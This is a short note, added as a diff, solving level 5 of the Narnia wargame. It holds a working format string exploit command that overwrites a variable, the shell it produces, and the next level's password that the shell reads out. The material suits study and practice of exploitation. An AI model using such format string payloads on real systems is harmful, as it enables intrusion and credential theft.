@@ -1,0 +1,10 @@
+############# JUST SAW THE WRITEUP, NOT KNOW MUCH ABOUT FORMAT STRING VULN ###########
+
+
+narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xe0\xd6\xff\xff" + "%496x%1$n"')
+Change i's value from 1 -> 500. GOOD
+$ id
+uid=14006(narnia6) gid=14005(narnia5) groups=14005(narnia5)
+$ cat /etc/narnia_pass/narnia6
+neezocaeng
+$ 
